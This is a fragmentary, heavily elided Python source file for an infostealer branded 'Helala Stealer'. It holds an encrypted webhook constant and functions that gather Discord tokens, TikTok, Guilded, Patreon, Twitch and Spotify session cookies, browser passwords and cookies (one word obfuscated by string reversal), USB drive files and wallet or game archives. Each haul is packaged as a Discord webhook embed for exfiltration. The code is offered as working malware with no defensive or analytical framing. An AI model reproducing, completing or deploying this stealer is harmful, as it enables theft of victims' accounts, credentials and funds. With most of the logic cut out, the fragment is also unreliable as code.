...
webhook = b"D\x18\x18\xe05\xf7\x98\x98'\x0e5\xd2<\xbe'\x03\xd2<}\x98P\xe0\x0e\x980\xa57D<<\xfe5\x98\x16\x96b&_\x16\xe8&\xb5_\xe8\xb5b&\xb5\xb5b\x16\xb5\x98\xd6a'\xec'\xbe\x1dr'\x8c\xec}\xd6\x940U\xbb<\x94\xef)\xa2\xda\xad\x8dr\xbe\xf8j\xe1\x86\x18\xc0Mj)7&'\xf5\xb5\x16`\x83\x86Ux\xc3&\xf8)\x18\xf5\x94\xe0\x8f\xecj\x90\xe0y\xc3\x84\x94r_\xda\xef",b'Y\x81\xaa|3iK\x97(.\xde\xd5\xc1t\x85\x1f\xe6\\\xddz\xe5\x93\x88\xf1\xa6\xd7\x15\xc7\x9c\n\xf9\xcc\t\xca1*\xf3\x08\xd4\xd8~@\xb0F\xfc\xef\x03\x98&\x16\xe8\x96\xd6b\xb5\xfb_U\xf7\x9b-\xf4]\xcb\xc2\x90)X\xa2\xdaJH\xf5xa\xe1\x8d\xady\x84\x1d\x83\x8fs2\xecn%\x01\x8cg\xbfd\xb4qr\x99P7\xd2\'\xa5\xbb\x94D\x0ej\xfe\x87}`<\xe0\xf8\xbe5\x18\xc0\x860\xc3lM\x02\x19\x1aS\xe7\xe4\xed\xe2\xff!\x8a\x13\xee\x04\x1b6\xaf\xb6\xd3\xba\xae\x0c\xebw\xf6\x11k\xd1\x1e\x7f=\x9dG\xcfC\x0f,\xdb\xe9\x8e\xfd\xc4\r/m \xd9N\xb7\xc5\xdf4\xf0\xa8\xd0\x00\x17f#W\x12VA\x05\xb9\x9f+Q\xea\xa7\x9ao"\xa4\xcd\x06[v8\x9ep\xc8\xdc\xb8\x82\x07\xf2\xb1\x10eu$h\x89\x8b\x95\xa3\xfaZ^\xe3L\xac\x91I\xc9\xbdBR\xbc\xc6{?\xa0\xb2Ec\xab:9\x92;\xa9O\x14\x1cT\xa1>\xce\xb3\x80\x0b'
logfile = '%Logfile%'
debug = False
FakeWebhook = False
Fakegen = False 
        ...
        try:
            ...
            for drive in drives:
                if '2' in drive:
                    ...
                    "username": "Helala Stealer",
                    "avatar_url": "https://cdn.discordapp.com/avatars/1351281965432574145/13a5a6e1ffd750ba60bd8f41392697f8.png",
                    "embeds": [
                        {
                            "title": "Helala Stealer USB Drivers",
                            "description": f"USB Drivers Files\n{upload}",
                            "color": 000000,
                            "thumbnail": {
                                "url": "https://cdn.discordapp.com/avatars/1351281965432574145/13a5a6e1ffd750ba60bd8f41392697f8.png"
                            },
                            "footer": {
                                "text": "Helala Stealer | discord.gg/helala",
                                "icon_url": "https://cdn.discordapp.com/avatars/1351281965432574145/13a5a6e1ffd750ba60bd8f41392697f8.png"
                            }
                        }
                    ]
                }
    ...
    try:
        ...
        if existing_files:
            ...
            if logfile == True:
                ...
                data = {
                        "username": "Helala Stealer",
                        "avatar_url": "https://cdn.discordapp.com/avatars/1351281965432574145/13a5a6e1ffd750ba60bd8f41392697f8.png3%89-discord-animation-astolfo-fate-white-face.png",
                        "embeds": [
                            {
            ...
            try:
                ...
                if logfile == True:
                    ...
                    data = {
                            ...
                            "embeds": [
                                {
                                    "title": "Helala Stealer ArchiSteamFarm",
...
def TikTokSession(cookie):
    try:
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": f"🍪 Helala Stealer Tiktok Session",
...
def uploadTokq(Tokq, path):
    ...
    pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{pfp}" if pfp else "https://cdn.discordapp.com/avatars/1351281965432574145/13a5a6e1ffd750ba60bd8f41392697f8.png3%89-discord-animation-astolfo-fate-white-face.png"
    back = GetBack()
    ...
    try:
        with concurrent.futures.ThreadPoolExecutor() as executor:
            ...
            data = {
                ...
                "embeds": [
                    {
                        "title": "🍪 Helala Stealer Information",
    ...
    if filetype == 'uploooad':
        ...
        try:
            ...
            data = {
                ...
                "embeds": [
                    {
                        "title": f"🍪 Helala Stealer {'drowssaP'[::-1]} and cookies",
...
def guilded(cookie):
    try:
        ...
        pfp = response["user"]["profilePicture"] if response["user"]["profilePicture"] else 'https://cdn.discordapp.com/avatars/1351281965432574145/13a5a6e1ffd750ba60bd8f41392697f8.png'
        try:
        ...
        data = {
                ...
                "embeds": [
                    {
                        "title": f"🍪 Helala Stealer Guilded Session",
                        "description": f"Founded user information ! :\n",
                        "color": 000000,
                        "author": {
                            "name": f"User information :",
...
def patreon(cookie):
    try:
        ...
        image = response["data"]["attributes"]["thumb_url"] if response["data"]["attributes"]["thumb_url"] else "https://cdn.discordapp.com/avatars/1351281965432574145/13a5a6e1ffd750ba60bd8f41392697f8.png"
        ...
        data = {
                ...
                "embeds": [
                    {
                        "title": f"🍪 Helala Stealer Patreon Session",
                        "description": f"Founded user information ! :\n",
                        "color": 000000,
                        "author": {
                            "name": f"User information :",
...
def twitch_session(auth_token, username):
    try:
        ...
        pfp = response["data"]["user"]["profileImageURL"] if response["data"]["user"]["profileImageURL"] else "https://cdn.discordapp.com/avatars/1351281965432574145/13a5a6e1ffd750ba60bd8f41392697f8.png"
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": f"🍪 Helala Stealer Twitch Session",
                    "description": f"Founded user information ! :\n",
                    "color": 000000,
                    "author": {
                        "name": f"User information :",
...
def spotify(cookie):
    try:
        ...
        data = {
                ...
                "embeds": [
                    {
                        "title": f"🍪 Helala Stealer Spotify Session",
                        "description": f"Founded user information ! :\n",
                        "color": 000000,
                        "author": {
                            "name": f"User information :",
...
def GatherZips(paths1, paths2, paths3):
    ...
    try:
        ...
        data = {
                "embeds": [
                    {
                        "title": "Helala Stealer Zips",
                        "description": f"{wal}\n{ga}\n{ot}",
                        "color": 000000,
                        "footer": {
                            "text": "Helala Stealer ZIP",
